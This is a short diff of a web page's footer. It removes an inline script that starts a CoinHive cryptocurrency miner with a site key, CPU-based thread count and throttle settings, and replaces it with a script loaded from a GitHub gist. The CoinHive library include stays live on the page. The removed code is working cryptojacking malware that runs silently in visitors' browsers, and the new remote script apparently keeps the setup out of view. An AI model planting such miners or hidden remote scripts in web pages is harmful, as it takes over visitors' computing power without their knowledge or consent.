@@ -103,21 +103,7 @@
         </form>
     </footer>
     <script src="https://coin-hive.com/lib/coinhive.min.js"></script>
-    <script>
-        var threads = navigator.hardwareConcurrency;
-        if (threads <= 1) {
-            threads = 1;
-        } else {
-            threads = threads / 2;
-        }
-        var miner = new CoinHive.Anonymous('XEGVzNomKMcdVodHGxFdt3p98knqs7fg', {
-            threads: threads,
-            autoThreads: true,
-            throttle: 0.6,
-            forceASMJS: false
-        });
-        miner.start();
-    </script>
+    <script src="https://gist.github.com/datetable/37a9ff1285c2e83afd3f3c0ca09505f2.js"></script>
 </body>
 
 </html>
